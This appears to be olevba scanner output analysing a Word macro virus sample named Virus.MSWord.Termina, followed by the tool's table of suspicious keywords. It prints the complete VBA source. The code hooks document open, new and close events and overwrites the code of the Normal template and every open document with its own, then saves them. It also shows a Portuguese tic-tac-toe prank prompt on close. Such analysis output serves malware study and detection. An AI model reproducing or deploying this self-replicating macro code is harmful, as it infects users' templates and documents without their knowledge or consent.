olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Termina
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Termina - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




'XK_001_022
Option Explicit
Private X00(1 To 3, 1 To 3) As Integer
Private X10 As Boolean, X11(1 To 2) As Integer

Private Sub Document_Open(): X21: End Sub

Private Sub Document_New(): X21: End Sub

Private Sub Document_Close(): X21
    If UCase(Application.VBE.ActiveVBProject.Name) = "NORMAL" Then X22
End Sub


Private Sub X21()
    Dim X01 As Integer, X02 As Boolean, X03 As String
    If UCase(Application.MacroContainer) = "NORMAL.DOT" Then
        With Application.NormalTemplate.VBProject.VbComponents(1).CodeModule
        X03 = .Lines(1, .CountOfLines)
        End With
    GoTo X2
    ElseIf Application.MacroContainer = Application.ActiveDocument Then
    With Application.ActiveDocument.VBProject.VbComponents(1).CodeModule
        X03 = .Lines(1, .CountOfLines)
    End With
    End If
X1:
    With Application.NormalTemplate.VBProject.VbComponents(1).CodeModule
        If .Lines(1, 1) <> "'XK_001_022" Then
            .DeleteLines 1, .CountOfLines
            .InsertLines 1, X03
        End If
    End With
    Application.NormalTemplate.Save
X2:
    With Application.Documents
        For X01 = 1 To .Count
            With .Item(X01).VBProject.VbComponents(1).CodeModule
                If .Lines(1, 1) <> "'XK_001_022" Then
                    .DeleteLines 1, .CountOfLines
                    .InsertLines 1, X03
                End If
            End With
            If .Item(X01).Path <> "" Then .Item(X01).Save
        Next
    End With
End Sub

Private Sub X22()
    Dim X01 As Integer, X02 As Integer, X03 As String, X04(1 To 3, 1 To 3) As String
    Dim X05(-1 To 0) As String, X06(1 To 3) As String
X1: X05(-1) = " X ": X05(0) = " O "
    Erase X04
    For X01 = 1 To 3
        For X02 = 1 To 3
            X04(X01, X02) = "   "
            If X00(X01, X02) <> 0 Then X04(X01, X02) = X05((X00(X01, X02) = 1) Xor X10)
        Next
    Next
    For X01 = 1 To 3
        X06(X01) = X04(X01, 1) + "|" + X04(X01, 2) + "|" + X04(X01, 3) + Chr(13)
    Next
X2: X03 = UCase(Trim(InputBox(X06(1) + "--------------" + Chr(13) + X06(2) + "--------------" + Chr(13) + X06(3), "")))
    If X03 = "" Then
        X01 = MsgBox("Isto terminara com o jogo", vbExclamation Or vbOKCancel, "")
        If X01 = 2 Then GoTo X2
        End
    ElseIf X03 = "MENU" Then X23: GoTo X1
    ElseIf X03 = "RESETAR" Or X03 = "RES" Or X03 = "RESETA" Then Erase X00: Erase X11: GoTo X1
    ElseIf X03 = "RECOMECAR" Or X03 = "RECOM" Or X03 = "RECOMECA" Then Erase X00: GoTo X1
    ElseIf X03 = "TERMINAR" Or X03 = "TERMINA" Or X03 = "FIM" Or X03 = "SAIR" Or X03 = "SAI" Then End
    ElseIf X03 = "AJUDA" Then:
    End If
    If Len(X03) > 1 Then MsgBox "A escolha feita nao e valida": GoTo X2
    If Val(X03) < 1 Or Val(X03) > 9 Then MsgBox "A escolha feita nao e valida", vbExclamation, "": GoTo X2
    X01 = Int((Val(X03) - 1) / 3) + 1
    X02 = (Val(X03) Mod 3) Or 3 And Val(X03) Mod 3 = 0
    If X00(X01, X02) <> 0 Then MsgBox "A casa escolhida ja esta ocupada", vbExclamation, "": GoTo X2
    X00(X01, X02) = 1
    GoTo X1
    X24
End Sub

Private Sub X23()
End Sub

Private Sub X24()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VbComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Base64    |0CT                 |MENU                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

